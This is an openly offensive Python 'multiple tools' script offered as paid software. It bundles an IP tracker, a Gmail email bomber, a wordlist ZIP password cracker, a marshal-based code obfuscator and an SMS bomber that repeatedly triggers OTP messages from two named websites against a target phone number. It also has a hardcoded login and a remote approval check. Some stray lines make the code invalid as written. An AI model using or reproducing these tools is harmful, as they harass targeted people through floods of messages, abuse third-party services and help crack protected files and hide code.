# Examination Project
# Proiect Name : MULTIPLE  TOOLS

import os
import sys
import time
import requests

os.system("clear")
print('\n\n')

ab= "\n\n\n\033[1;32m 		SYSTEM INSTALL LOADIND..........\033[1;0m"

#print('\n\n\n\033[1;95m		UPDATE SUCCESSFUL ')


for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

os.system("clear")
print('\n\n\n')
time.sleep(2)

ab= "		\033[1;96mSuccessful Loaded.....\n\033[1;0m"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
	
print('\n')

#name= input('		\033[1;35mYour Name: ')

#ab = "Hey " +name+", Welcome To Powerful D-DOS Tools\033[1;0m"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
	
print('\n\n')
time.sleep(2)

print('\033[1;32m===================================================\033[1;0m')
ab= (""" \033[1;36m
	
	 ________   ______  __      __  __      __   ______   __    __       
	|        \\ /      \\|  \\    /  \\|  \\    /  \\ /      \\ |  \\  |  \\      
	 \\$$$$$$$$|  $$$$$$\\\\$$\\  /  $$ \\$$\\  /  $$|  $$$$$$\\| $$\\ | $$      
	    /  $$ | $$__| $$ \\$$\\/  $$   \\$$\\/  $$ | $$__| $$| $$$\\| $$      
	   /  $$  | $$    $$  \\$$  $$     \\$$  $$  | $$    $$| $$$$\\ $$      
	  /  $$   | $$$$$$$$   \\$$$$       \\$$$$   | $$$$$$$$| $$\\$$ $$      
	 /  $$___ | $$  | $$   | $$        | $$    | $$  | $$| $$ \\$$$$      
	|  $$    \\| $$  | $$   | $$        | $$    | $$  | $$| $$  \\$$$      
	 \\$$$$$$$$ \\$$   \\$$    \\$$         \\\\$$     \\$$   \\$$ \\$$   \\$$      
	                                                                     
	                                                                     
	                                                                     
	 _______    ______   ______  ________                                
	|       \\  /      \\ |      \\|        \\                               
	| $$$$$$$\\|  $$$$$$\\ \\$$$$$$| $$$$$$$$                               
	| $$__| $$| $$__| $$  | $$  | $$__                                   
	| $$    $$| $$    $$  | $$  | $$  \\                                  
	| $$$$$$$\\| $$$$$$$$  | $$  | $$$$$                                  
	| $$  | $$| $$  | $$ _| $$_ | $$                                     
	| $$  | $$| $$  | $$|   $$ \\| $$                                     
	 \\$$   \\$$ \\$$   \\$$ \\$$$$$$ \\$$                                                                                           
		
\033[1;32m===================================================\033[1;0m
\033[1;35m
Developer 		: MOHAMMAD ARAFAT
Tools Name	: MULTIPLE TOOLS
Tools Version 	: Premium (5.5)
Method 		: Paid
Github 		: https://github.com/Hamidul248
Facebook	: Mohammad.Arafat
		\033[0;92m Use Only Education Purposes
\033[1;32m===================================================\033[1;0m
""")


for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.02)

while True:
	username= input('\033[1;32mUser Name : \033[2;0m')
	password= input('\033[1;35mEnter Access Token : \033[1;0m')
	if username == 'ARAFAT' and password == '786' :
		print('	\033[0;1m You Have Successfully Login.')
		break
	else:
		print('\033[0;95mIncorrect Token Number, Please Try Again')
		os.system('xdg-open https://www.facebook.com/Mohammad.Arafat.SCFB')
		sys.exit()
		
 Paid/Approval Tools ⬇️
import uuid, os, requests, sys

def unique():
	id= uuid.uuid4()
	file= "~/.mydeviceid"
	loc = os.path.expanduser(file)
	print('Chaking.....')
	if os.path.exists(loc):
		f= open(loc, 'r')
		f= f.read().strip()
		req= requests.get('https://raw.githubusercontent.com/Hamidul248/Approval/refs/heads/main/Approval.txt').text
	if f in req:
		pass
	else:
		print('Your ID is:\033[1;33m '+ f)
		print('\033[1;31mContract the owner MOHAMMAD ARAFAT for approval')
		os.system('xdg-open https://www.facebook.com/Mohammad.Arafat.SCFB')
		sys.exit()

	return
	
	print('Your ID is: \033[1;33m'+ str(id))
	a= open(loc, 'w')
	a= a.write(str(id))
	print('\033[1;31mContract The Owner MOHAMMAD ARAFAT  For Approval \033[1;0m')
	os.system('xdg-open https://www.facebook.com/Mohammad.Arafat.SCFB')
	sys.exit()

unique()

print('		Welcome To Our Tools')
 Approval Tools Finish 

def ipt(): # IP Tracker Tools
	ip= input('\033[0;1m \033[1;32mEnter Your Target IP : ')
	
	req= requests.get("http://ip-api.com/json/"+ ip)
	
	r= req.json()
	
	print(f'\n 🌍 \033[0;92mCountry :\033[0;93m{r["country"]}')
	print(f"\n 📬 \033[0;92mCountry Code :\033[0;93m{r['countryCode']}")
	print(f"\n 🧭 \033[0;92m Region : \033[0;93m{r['regionName']}")
	print(f"\n 🌐\033[0;92m City : \033[0;93m{r['city']}")
	print(f"\n 📟 \033[0;92m Code : \033[0;93m{r['zip']}")
	print(f"\n 📶 \033[0;92m Provider : \033[0;93m{r['isp']}")
	print(f"\n ☎️ \033[0;92m Organization : \033[0;93m{r['org']}")
	print(f"\n 📍 \033[0;92m Lat & Lon : \033[0;93m{r['lat']},{r['lon']}")
	print(f"\n 🕛 \033[0;92m Time Zone : \033[0;93m{r['timezone']}")
	print(f"\n 📲 \033[0;92m Provider : \033[0;93m{r['as']}\033[0;0m")
	
	print("\033[1;33mLive Location : https:// www.google.com/maps/search/?api=1&query={r['lat']},{r['lon']}")
	
	print('\n		✅🔰 \033[1;92mIP Tracking Success')	
	
	
def emailb(): #Email Boom Tools
	import smtplib
	server= smtplib.SMTP("smtp.gmail.com", "587")
	
	server.ehlo()
	server.starttls()
	
	g= input('\033[0;92mEnter Your Gmail: ')
	p= input('\033[0;93mEnter Your App Pass: ')
	server.login(g, p)
	
	to= input('\033[1;32mEnter Target Mail: ')
	s= input('\033[0;91mSubject: ')
	m= input('\033[1;33mType Your Massage: ')
	limit= int(input('\034[1;33mSending Limit. '))
	
	msg = s+ '\n\n' +m
	
	for i in range (limit):
		i= i+1
		server.sendmail(g, to, msg)
		print(f'\33[0;94m{i}. [🔰] MAIL Send Success')
		time.sleep(0.02)


def zipc(): #Zip File Craco Tools
	import zipfile
	
	z= input('\033[0;92mEnter Zip File Path: ')
	zip= zipfile.ZipFile(z)
	
	pw= input('\033[1;33mEnter Password List Path: ')
	
	file= open(pw, 'r')
	
	for password in file:
		password= password.strip()
		try:
			zip.extractall(pwd= bytes(password, 'utf-8'))
			print('\033[1;32mPassword is: '+ password)
			break 
			
		except:
			print('\033[1;31mWrong Password'+ password)



def encript(): #File Encryption Tools
	import marshal
	
	
	inp= input('\n\n\033[0;92mEnter Your File Path: ')
	out= input('\033[0;94mEnter Output File Name: ')
	
	f= open(inp, 'r')
	f= f.read()
	
	comp= compile(f,' ', 'exec')
	
	com= marshal.dumps(comp)
	
	new= open(out, 'w')
	
	new.write("import marshal\n exec(marshal.loads({repr(comp)}))")
	
	print('\033[0;95mYour File Encrypt Successful ')


def smsboom(): #SMS Bombing Tools
	import requests

	num= input('\033[1;40mEnter Target Number:  \033[1;0m')
	am= int(input('\033[1;34Enter Amount:  \033[1;0m'))
	sent= 0
	print('Attacking..........')
	
	while sent<am:
		ab= requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+num)
		
		if ab.status_code ==200:
			sent+=1
			print(f'\033[1;32m{sent}. [√] Sent Success')
		else:
			pass
		
		a= requests.get('https://apibeta.iqra-live.com/api/v2/sent-otp/'+num)
		if a.status_code==200:
			sent+=1
			print(f'\033[1;35m{sent}. [🔰] Sent Successful\033[1;0m')
		else:
			pass

def stop():
			return
			

print(''' \033[1;92m
	
  1.  IP Addtess Tracking
  2. Email Bombinhlg
  3. ZIP File Cracking
  4. File Encryption
  5. SMS Bombing
  6. Stop

\033[1;0m
''')


menu= input('Enter Your Choice: ')

ab= "\033[1;96m Processing Your Request Please Waiting For Few Second..........\n\033[1;0m"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
	

if menu== '1':
	ipt()
elif menu== '2':
	emailb()
elif menu== '3':
	zipc()
elif menu== '4':
	encript()
elif menu== '5':
	smsboom()
elif menu== '6':
	stop()
	